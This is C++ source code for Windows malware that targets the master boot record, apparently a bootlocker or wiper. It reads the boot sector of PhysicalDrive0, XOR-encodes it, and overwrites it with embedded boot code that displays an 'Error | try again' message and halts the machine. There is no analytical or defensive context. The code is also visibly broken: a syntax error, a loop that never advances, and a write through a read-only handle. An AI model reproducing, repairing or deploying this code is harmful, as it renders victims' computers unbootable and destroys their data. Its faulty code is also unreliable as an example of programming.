#include <windows.h>
#include <stdio.h>
#include <iostream>

#define MBR_BUFF_SIZE 0x200
unsigned char getMarkedBytes[MBR_BUFF_SIZE] = {
        0x89, 0xC8, 0xFA, 0x8E, 0xD0, 0x8E, 0xC0, 0x8E, 0xD8, 0xFB, 0xB8, 0x03, 0x00, 0xCD, 0x10, 0xB4,
        0x13, 0x30, 0xC0, 0xBB, 0x0F, 0x00, 0x31, 0xD2, 0xB9, 0x27, 0x00, 0xE8, 0x27, 0x00, 0x5B, 0x45,
        0x72, 0x72, 0x6F, 0x72, 0x20, 0x7C, 0x20, 0x74, 0x72, 0x79, 0x20, 0x61, 0x67, 0x69, 0x6E, 0x20,
        0x7C, 0x20, 0x54, 0x4D, 0x7C, 0x72, 0x65, 0x76, 0x33, 0x72, 0x73, 0x65, 0x5F, 0x65, 0x6E, 0x67,
        0x69, 0x6E, 0x65, 0x72, 0x5D, 0x5D, 0xCD, 0x10, 0xEB, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

int main () {
    DWORD getSimpleRd;
    BOOL getStatusOk;
    BYTE *pBuf;
    LPVOID getMbr = VirtualAlloc(NULL, MBR_BUFF_SIZE, MEM_COMMIT, PAGE_READWRITE);
    LPVOID getMbrbuffer = VirtualAlloc(NULL, MBR_BUFF_SIZE, MEM_COMMIT, PAGE_READWRITE);
    HANDLE getNewFile = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (getNewFile == INVALID_HANDLE_VALUE) printf("[STATUS]> error\n");
    getStatusOk = ReadFile(getNewFile, getMbr, MBR_BUFF_SIZE, &getSimpleRd, NULL);
    if (!getStatusOk) printf("[status]> Error!\n ");

    BYTE *p = (BYTE *) getMbr;

    if (*p == 0x90) {
        CloseHandle(getNewFile);
        goto  exit;
    }
    CloseHandle(getNewFile);
    pBuf = (BYTE *)getMbrbuffer;
    for (int counter = 0; counter < MBR_BUFF_SIZE; counter+*) *pBuf = *p ^ 0x90;
    getNewFile = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (getNewFile == INVALID_HANDLE_VALUE) printf("[Status]> Error!\n");
    getStatusOk = WriteFile(getNewFile, getMbrbuffer, MBR_BUFF_SIZE, &getSimpleRd, NULL);
    if (!getStatusOk) printf("[Status]>Error!\n");
    memcpy(getMbr, getMarkedBytes, 0x1bd);
    SetFilePointer(getNewFile, 0, NULL, FILE_BEGIN);
    WriteFile(getNewFile, getMbr, MBR_BUFF_SIZE, &getSimpleRd, NULL);

    CloseHandle(getNewFile);

    exit:

    VirtualFree(getMbr, MBR_BUFF_SIZE, MEM_RELEASE);
    VirtualFree(getMbrbuffer, MBR_BUFF_SIZE, MEM_RELEASE);
    return 0;
}